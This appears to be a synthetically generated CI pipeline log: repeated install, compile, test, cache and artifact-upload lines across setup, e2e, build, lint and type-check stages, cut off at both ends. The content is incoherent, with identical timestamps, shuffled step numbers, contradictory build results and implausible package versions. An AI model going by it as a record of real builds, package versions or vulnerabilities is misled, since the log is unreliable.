build.tar.gz (15MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:34] INFO: Processing request\nInstalling webpack@2.3.0\n\u2713 build completed\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_user_create (404ms)\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling eslint@3.19.0\n  PASS: test_cache_hit (274ms)\n  PASS: test_auth_login (303ms)\n  PASS: test_api_health (129ms)\nArtifact uploaded: build.tar.gz (43MB)\nStep 3/10: Building\nCache hit for key-3532\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 test completed\nCache hit for key-6780\n  PASS: test_api_health (352ms)\n[12:00:34] INFO: Processing request\nCache hit for key-3528\n  PASS: test_db_connect (149ms)\nArtifact uploaded: build.tar.gz (50MB)\n=== Step deploy_production completed ===\n=== Step: setup_environment ===\nCache hit for key-9828\nCache hit for key-5927\n\u2713 test completed\n\u2713 lint completed\nCache hit for key-1162\n\u2717 build failed with exit code 84\nArtifact uploaded: build.tar.gz (19MB)\nStep 4/10: Building\n\u2713 test completed\nCompiling src/main.py...\n  PASS: test_cache_hit (212ms)\nArtifact uploaded: build.tar.gz (19MB)\nCompiling src/service.java...\n\u2713 lint completed\n  PASS: test_auth_login (468ms)\n\u2713 lint completed\n  PASS: test_auth_login (198ms)\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:34] INFO: Processing request\n  PASS: test_user_create (431ms)\nArtifact uploaded: build.tar.gz (23MB)\nInstalling react@2.1.0\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_db_connect (131ms)\nStep 3/10: Building\n  PASS: test_user_create (325ms)\nInstalling eslint@1.2.0\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_db_connect (333ms)\n  PASS: test_api_health (387ms)\nCompiling src/main.py...\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (6MB)\nInstalling eslint@5.18.0\n  PASS: test_user_create (431ms)\nArtifact uploaded: build.tar.gz (26MB)\nInstalling react@1.3.0\nStep 6/10: Building\nCompiling src/handler.rs...\nCompiling src/app.ts...\nStep 5/10: Building\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nInstalling prettier@2.4.0\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 build completed\nStep 9/10: Building\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/utils.go...\n\u2713 test completed\n  PASS: test_user_create (13ms)\n[12:00:34] INFO: Processing request\nStep 2/10: Building\nInstalling eslint@3.20.0\nException: TypeError\nCompiling src/index.js...\n  PASS: test_auth_login (476ms)\n  PASS: test_auth_login (15ms)\n[12:00:34] INFO: Processing request\nInstalling axios@5.3.0\n\u2713 build completed\n  PASS: test_api_health (393ms)\nStep 9/10: Building\nStep 4/10: Building\nInstalling react@4.2.0\n  PASS: test_user_create (486ms)\nCache hit for key-2221\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] ERROR: Connection failed\n\u2713 lint completed\nStep 5/10: Building\n[12:00:34] INFO: Processing request\nException: RuntimeError\nStep 4/10: Building\n[12:00:34] INFO: Processing request\n\u2713 build completed\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (40MB)\nCache hit for key-9057\nCache hit for key-9830\nArtifact uploaded: build.tar.gz (36MB)\nInstalling axios@5.0.0\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:34] INFO: Processing request\nStep 3/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n[12:00:34] INFO: Processing request\n\u2713 test completed\n  PASS: test_cache_hit (256ms)\nCompiling src/index.js...\n\u2713 test completed\nStep 3/10: Building\n\u2713 build completed\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nInstalling prettier@3.0.0\nInstalling lodash@4.18.0\nArtifact uploaded: build.tar.gz (21MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nInstalling prettier@3.12.0\nCompiling src/service.java...\n\u2713 build completed\nFAILED: test_db_connect\nCompiling src/main.py...\n\u2713 test completed\nInstalling axios@3.1.0\n[12:00:34] INFO: Processing request\nStep 7/10: Building\n  PASS: test_auth_login (168ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-9792\nCache hit for key-7813\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 1/10: Building\n\u2713 build completed\n[12:00:34] WARN: Deprecated API usage\n\u2713 build completed\nInstalling jest@2.10.0\nCache hit for key-6548\nCompiling src/app.ts...\nWARNING: axios has known vulnerabilities\n[12:00:34] INFO: Processing request\n\u2713 build completed\nInstalling express@2.15.0\n\u2713 lint completed\nCache hit for key-1413\n  PASS: test_cache_hit (391ms)\nCache hit for key-5699\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:34] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (44MB)\n\u2717 build failed with exit code 98\nCompiling src/service.java...\n\u2717 build failed with exit code 81\n  PASS: test_cache_hit (161ms)\nWARNING: jest has known vulnerabilities\nInstalling webpack@2.8.0\nInstalling express@4.17.0\n[12:00:34] INFO: Processing request\nStep 4/10: Building\n\u2713 test completed\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nStep 4/10: Building\nStep 6/10: Building\n[12:00:34] INFO: Processing request\nCache hit for key-5500\n[12:00:34] INFO: Processing request\nStep 10/10: Building\nCache hit for key-1277\nArtifact uploaded: build.tar.gz (21MB)\nCache hit for key-6680\n\u2717 build failed with exit code 2\n  PASS: test_user_create (47ms)\nStep 1/10: Building\n  PASS: test_cache_hit (466ms)\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_api_health (156ms)\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-4276\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\n\u2717 build failed with exit code 100\n  PASS: test_db_connect (338ms)\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\nCache hit for key-8529\nStep 7/10: Building\nStep 10/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (27ms)\nStep 6/10: Building\nInstalling react@2.10.0\n\u2713 build completed\nCompiling src/utils.go...\nCache hit for key-3295\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\nInstalling prettier@5.18.0\n\u2713 lint completed\nInstalling react@1.1.0\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/main.py...\nStep 6/10: Building\nInstalling prettier@2.12.0\nInstalling react@5.11.0\nCache hit for key-8391\nArtifact uploaded: build.tar.gz (35MB)\nCompiling src/index.js...\nFAILED: test_db_connect\nWARNING: react has known vulnerabilities\n  PASS: test_user_create (232ms)\nStep 6/10: Building\nStep 3/10: Building\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_cache_hit (321ms)\n\u2713 lint completed\nStep 4/10: Building\n  PASS: test_cache_hit (186ms)\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/utils.go...\nStep 2/10: Building\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: axios has known vulnerabilities\nInstalling react@1.18.0\nStep 8/10: Building\nInstalling webpack@1.16.0\nStep 4/10: Building\n\u2713 test completed\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nInstalling lodash@1.18.0\nCompiling src/service.java...\nCache hit for key-4861\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-5203\n[12:00:34] INFO: Processing request\nCache hit for key-6485\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (42MB)\nStep 6/10: Building\n[12:00:34] INFO: Processing request\nStep 2/10: Building\n[12:00:34] INFO: Processing request\nInstalling axios@1.10.0\nCompiling src/main.py...\n  PASS: test_db_connect (418ms)\n[12:00:34] INFO: Processing request\nStep 1/10: Building\nStep 5/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2713 build completed\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nStep 9/10: Building\n[12:00:34] INFO: Processing request\nFAILED: test_auth_login\n\u2713 build completed\nInstalling jest@4.12.0\nArtifact uploaded: build.tar.gz (1MB)\nInstalling express@4.6.0\n[12:00:34] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (40MB)\nInstalling react@1.17.0\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\nCache hit for key-5180\n  PASS: test_api_health (130ms)\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (376ms)\nCache hit for key-6210\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nCompiling src/main.py...\n  PASS: test_user_create (83ms)\n  PASS: test_user_create (248ms)\nInstalling express@2.20.0\nStep 3/10: Building\nCache hit for key-6913\n\u2713 test completed\n\u2713 test completed\nCache hit for key-4815\n\u2713 lint completed\nStep 7/10: Building\nStep 5/10: Building\n\u2713 test completed\nStep 3/10: Building\nStep 1/10: Building\nStep 3/10: Building\n[12:00:34] INFO: Processing request\n\u2713 build completed\n\u2713 lint completed\n\u2713 test completed\nStep 6/10: Building\nInstalling lodash@5.16.0\nInstalling lodash@5.13.0\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_auth_login (219ms)\n  PASS: test_auth_login (143ms)\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (19MB)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_db_connect (307ms)\n\u2713 lint completed\n  PASS: test_cache_hit (486ms)\n\u2713 test completed\nException: RuntimeError\nException: NullPointerException\n  PASS: test_api_health (193ms)\n\u2717 build failed with exit code 107\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_auth_login (386ms)\nStep 3/10: Building\nCompiling src/index.js...\nStep 8/10: Building\nCache hit for key-5444\n\u2713 test completed\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCache hit for key-3915\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\n\u2713 build completed\n  PASS: test_auth_login (480ms)\n  PASS: test_db_connect (319ms)\n\u2713 test completed\n\u2713 lint completed\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\nCache hit for key-1375\nInstalling jest@4.6.0\n\u2713 test completed\n  PASS: test_api_health (306ms)\nCompiling src/app.ts...\nStep 3/10: Building\n\u2713 test completed\nFAILED: test_api_health\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:34] INFO: Processing request\nFAILED: test_db_connect\nCache hit for key-7848\nArtifact uploaded: build.tar.gz (32MB)\nInstalling prettier@3.13.0\nCompiling src/app.ts...\n  PASS: test_db_connect (48ms)\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 lint completed\n\u2713 test completed\nInstalling prettier@3.5.0\n  PASS: test_user_create (480ms)\n[12:00:34] ERROR: Connection failed\nInstalling lodash@1.15.0\nCompiling src/index.js...\nCompiling src/app.ts...\n  PASS: test_db_connect (175ms)\nStep 4/10: Building\n\u2713 build completed\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\nInstalling axios@1.9.0\n[12:00:34] INFO: Processing request\nStep 2/10: Building\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-5621\nInstalling lodash@3.15.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-7298\n[12:00:34] INFO: Processing request\nInstalling express@3.0.0\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\nCompiling src/main.py...\n=== Step e2e_tests completed ===\n=== Step: build ===\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (316ms)\n  PASS: test_cache_hit (78ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (30MB)\n\u2717 build failed with exit code 91\n  PASS: test_cache_hit (7ms)\nStep 7/10: Building\n\u2713 lint completed\nCache hit for key-8212\nStep 1/10: Building\n\u2713 lint completed\n[12:00:34] ERROR: Connection failed\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (10MB)\nInstalling react@5.7.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (360ms)\n[12:00:34] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 test completed\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-3811\n\u2713 build completed\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nInstalling eslint@2.13.0\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\nException: ValueError\nInstalling axios@2.16.0\nCompiling src/handler.rs...\nWARNING: webpack has known vulnerabilities\nStep 10/10: Building\nCache hit for key-2353\n  PASS: test_user_create (431ms)\nInstalling webpack@2.3.0\nCache hit for key-9400\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nInstalling lodash@1.18.0\nWARNING: eslint has known vulnerabilities\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (16MB)\nArtifact uploaded: build.tar.gz (23MB)\nCompiling src/handler.rs...\n  PASS: test_auth_login (241ms)\n[12:00:34] INFO: Processing request\nCache hit for key-1149\nStep 10/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nCompiling src/index.js...\n  PASS: test_cache_hit (418ms)\n  PASS: test_user_create (158ms)\nCache hit for key-2495\nCompiling src/handler.rs...\nCache hit for key-8548\nInstalling express@2.6.0\nInstalling webpack@2.17.0\n[12:00:34] INFO: Processing request\nException: TypeError\nInstalling express@3.7.0\n  PASS: test_api_health (311ms)\nCache hit for key-5314\nCompiling src/utils.go...\n  PASS: test_db_connect (355ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-6825\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n\u2713 build completed\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-5861\nCompiling src/app.ts...\nCompiling src/index.js...\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\nException: RuntimeError\nStep 8/10: Building\nCache hit for key-3100\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling prettier@5.3.0\n[12:00:34] INFO: Processing request\nStep 2/10: Building\n\u2713 test completed\nStep 8/10: Building\nStep 8/10: Building\nCompiling src/index.js...\n\u2713 lint completed\nInstalling jest@3.5.0\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 test completed\n\u2713 lint completed\nStep 5/10: Building\nCache hit for key-3139\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 build completed\nCompiling src/main.py...\n  PASS: test_user_create (335ms)\n\u2717 build failed with exit code 92\nCompiling src/utils.go...\n  PASS: test_auth_login (193ms)\n  PASS: test_cache_hit (194ms)\nStep 5/10: Building\nInstalling react@2.12.0\n  PASS: test_user_create (356ms)\nArtifact uploaded: build.tar.gz (25MB)\nInstalling eslint@5.12.0\n  PASS: test_cache_hit (118ms)\nArtifact uploaded: build.tar.gz (28MB)\nInstalling webpack@1.0.0\nInstalling jest@3.10.0\nWARNING: express has known vulnerabilities\nStep 8/10: Building\nCompiling src/utils.go...\n  PASS: test_cache_hit (82ms)\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] WARN: Deprecated API usage\n\u2713 build completed\n[12:00:34] INFO: Processing request\nInstalling lodash@4.12.0\n  PASS: test_api_health (46ms)\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:34] INFO: Processing request\nCompiling src/handler.rs...\nCompiling src/app.ts...\nCompiling src/handler.rs...\n  PASS: test_auth_login (174ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (18MB)\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:34] INFO: Processing request\nException: RuntimeError\nStep 1/10: Building\nWARNING: eslint has known vulnerabilities\nInstalling jest@1.12.0\nInstalling express@5.9.0\nCache hit for key-7004\n  PASS: test_api_health (223ms)\nInstalling eslint@3.15.0\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\n\u2713 test completed\nInstalling jest@1.1.0\nCompiling src/service.java...\nException: TypeError\nStep 2/10: Building\nCache hit for key-9146\nStep 1/10: Building\nCompiling src/service.java...\nCache hit for key-1735\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_auth_login (16ms)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\n\u2713 lint completed\n\u2713 lint completed\n\u2713 build completed\nCache hit for key-4330\nCache hit for key-5183\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (73ms)\nWARNING: jest has known vulnerabilities\n\u2713 test completed\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (31MB)\nStep 3/10: Building\nCompiling src/handler.rs...\nInstalling lodash@3.2.0\n[12:00:34] INFO: Processing request\nCache hit for key-4749\n=== Step build completed ===\n=== Step: lint ===\n  PASS: test_db_connect (204ms)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (43MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-5890\n  PASS: test_cache_hit (78ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (35MB)\nInstalling lodash@2.10.0\nCache hit for key-2140\n  PASS: test_api_health (81ms)\nCache hit for key-8728\nCompiling src/index.js...\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 2/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (149ms)\nStep 3/10: Building\nCompiling src/handler.rs...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nInstalling axios@3.19.0\nCache hit for key-8921\nCache hit for key-5159\nCompiling src/service.java...\n  PASS: test_user_create (454ms)\n  PASS: test_db_connect (292ms)\nInstalling lodash@1.14.0\n\u2713 lint completed\nCompiling src/utils.go...\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_api_health (23ms)\nWARNING: express has known vulnerabilities\n  PASS: test_db_connect (361ms)\nStep 3/10: Building\n[12:00:34] INFO: Processing request\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (36MB)\nInstalling prettier@4.11.0\nCache hit for key-8066\n  PASS: test_api_health (226ms)\n  PASS: test_user_create (111ms)\n[12:00:34] INFO: Processing request\nCache hit for key-2648\nCache hit for key-2978\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_cache_hit (182ms)\nCompiling src/index.js...\nCompiling src/utils.go...\nCache hit for key-8757\nInstalling eslint@3.0.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\n[12:00:34] INFO: Processing request\nStep 6/10: Building\n  PASS: test_auth_login (304ms)\nArtifact uploaded: build.tar.gz (50MB)\nInstalling express@4.1.0\n[12:00:34] WARN: Deprecated API usage\n\u2713 test completed\nCache hit for key-2202\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-9288\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_cache_hit (39ms)\nCompiling src/utils.go...\n  PASS: test_api_health (325ms)\n  PASS: test_db_connect (405ms)\nInstalling eslint@3.20.0\nInstalling express@5.3.0\nStep 4/10: Building\n  PASS: test_user_create (260ms)\n  PASS: test_auth_login (187ms)\nInstalling prettier@1.12.0\n  PASS: test_api_health (447ms)\n  PASS: test_auth_login (190ms)\n\u2713 lint completed\n[12:00:34] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nCache hit for key-6770\nStep 10/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (45ms)\nCache hit for key-9492\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:34] INFO: Processing request\nInstalling eslint@2.7.0\nStep 3/10: Building\nFAILED: test_cache_hit\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 lint completed\nInstalling jest@1.5.0\n\u2713 lint completed\n\u2717 build failed with exit code 6\n  PASS: test_user_create (192ms)\n[12:00:34] INFO: Processing request\nCache hit for key-3216\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-2251\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_user_create (76ms)\n  PASS: test_user_create (489ms)\nInstalling express@5.13.0\nWARNING: lodash has known vulnerabilities\nCache hit for key-2604\n\u2713 test completed\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nInstalling jest@5.5.0\n[12:00:34] INFO: Processing request\n\u2713 build completed\n\u2713 test completed\nInstalling prettier@1.18.0\nStep 5/10: Building\nCache hit for key-1820\nArtifact uploaded: build.tar.gz (49MB)\nStep 9/10: Building\n  PASS: test_cache_hit (314ms)\nStep 4/10: Building\n  PASS: test_auth_login (82ms)\nStep 1/10: Building\n[12:00:34] ERROR: Connection failed\nCache hit for key-4103\nStep 1/10: Building\nStep 3/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] WARN: Deprecated API usage\n\u2713 test completed\n[12:00:34] INFO: Processing request\n\u2713 build completed\n[12:00:34] WARN: Deprecated API usage\nCache hit for key-6035\n  PASS: test_user_create (116ms)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nInstalling prettier@5.4.0\n  PASS: test_cache_hit (167ms)\nStep 8/10: Building\nInstalling lodash@1.0.0\n\u2713 test completed\n  PASS: test_cache_hit (408ms)\nInstalling axios@1.3.0\n[12:00:34] INFO: Processing request\nException: NullPointerException\n[12:00:34] WARN: Deprecated API usage\nInstalling react@1.7.0\nCompiling src/service.java...\nStep 4/10: Building\nStep 5/10: Building\nInstalling eslint@5.10.0\n  PASS: test_api_health (423ms)\nInstalling jest@1.12.0\nWARNING: lodash has known vulnerabilities\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (49MB)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (11MB)\nInstalling jest@3.0.0\n\u2713 test completed\n\u2713 test completed\nCache hit for key-6604\nCache hit for key-2374\nInstalling lodash@4.6.0\nFAILED: test_db_connect\nCache hit for key-1384\n[12:00:34] ERROR: Connection failed\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 test completed\n[12:00:34] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (25MB)\n  PASS: test_api_health (60ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:34] INFO: Processing request\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 25\nCompiling src/index.js...\n=== Step lint completed ===\n=== Step: type_check ===\nStep 6/10: Building\n[12:00:34] INFO: Processing request\nCompiling src/service.java...\nCompiling src/utils.go...\n  PASS: test_auth_login (345ms)\nInstalling axios@1.13.0\n  PASS: test_auth_login (431ms)\nInstalling eslint@3.2.0\n[12:00:34] INFO: Processing request\n  PASS: test_cache_hit (469ms)\n  PASS: test_cache_hit (342ms)\nCompiling src/index.js...\nCache hit for key-7047\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: react has known vulnerabilities\nCache hit for key-3357\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (5MB)\nArtifact uploaded: build.tar.gz (16MB)\nInstalling react@3.7.0\nStep 8/10: Building\nInstalling jest@5.16.0\nStep 7/10: Building\nCache hit for key-5551\n  PASS: test_db_connect (165ms)\nInstalling axios@5.11.0\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 build completed\n\u2713 build completed\nInstalling express@2.5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\nInstalling react@5.20.0\nArtifact uploaded: build.tar.gz (11MB)\n[12:00:34] INFO: Processing request\nCache hit for key-6245\n  PASS: test_cache_hit (168ms)\nCompiling src/utils.go...\nCache hit for key-9505\n\u2713 lint completed\nCache hit for key-9219\n  PASS: test_api_health (268ms)\n[12:00:34] INFO: Processing request\n\u2713 test completed\nCache hit for key-2036\n  PASS: test_auth_login (317ms)\nInstalling jest@4.1.0\n[12:00:34] INFO: Processing request\nFAILED: test_api_health\nStep 5/10: Building\nStep 3/10: Building\n\u2713 build completed\nWARNING: express has known vulnerabilities\n[12:00:34] INFO: Processing request\nCache hit for key-9350\n\u2713 build completed\nStep 3/10: Building\nCache hit for key-6663\nCache hit for key-5464\n\u2713 lint completed\nCompiling src/utils.go...\nStep 4/10: Building\n  PASS: test_api_health (95ms)\nStep 4/10: Building\nCache hit for key-1167\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (244ms)\n[12:00:34] INFO: Processing request\nCache hit for key-7683\nInstalling react@1.16.0\nStep 9/10: Building\n\u2713 test completed\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 test completed\n  PASS: test_db_connect (455ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 8/10: Building\n\u2713 test completed\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nInstalling webpack@5.7.0\n\u2717 build failed with exit code 89\nArtifact uploaded: build.tar.gz (20MB)\nInstalling webpack@3.17.0\n\u2713 test completed\n\u2713 build completed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/handler.rs...\n\u2713 build completed\nCompiling src/utils.go...\nInstalling lodash@1.14.0\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-6580\nStep 4/10: Building\n[12:00:34] INFO: Processing request\n\u2713 lint completed\nCompiling src/app.ts...\nInstalling prettier@4.9.0\n  PASS: test_api_health (318ms)\n[12:00:34] ERROR: Connection failed\n  PASS: test_db_connect (373ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (154ms)\nStep 2/10: Building\nCache hit for key-5046\nArtifact uploaded: build.tar.gz (32MB)\nCompiling src/index.js...\nCache hit for key-3128\n[12:00:34] ERROR: Connection failed\nStep 10/10: Building\nCompiling src/handler.rs...\n  PASS: test_user_create (472ms)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\nStep 7/10: Building\nCompiling src/app.ts...\n[12:00:34] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (309ms)\nInstalling express@3.17.0\n[12:00:34] INFO: Processing request\n  PASS: test_db_connect (114ms)\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nInstalling webpack@1.17.0\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/utils.go...\n\u2713 lint completed\nStep 3/10: Building\nStep 6/10: Building\nInstalling express@4.15.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 build completed\n[12:00:34] INFO: Processing request\nWARNING: axios has known vulnerabilities\nInstalling axios@3.12.0\nInstalling webpack@1.2.0\nStep 6/10: Building\n  PASS: test_cache_hit (5ms)\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (46MB)\nStep 7/10: Building\n  PASS: test_user_create (78ms)\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 build completed\nCompiling src/service.java...\n  PASS: test_db_connect (70ms)\n\u2713 test completed\nInstalling axios@2.5.0\n[12:00:34] INFO: Processing request\nStep 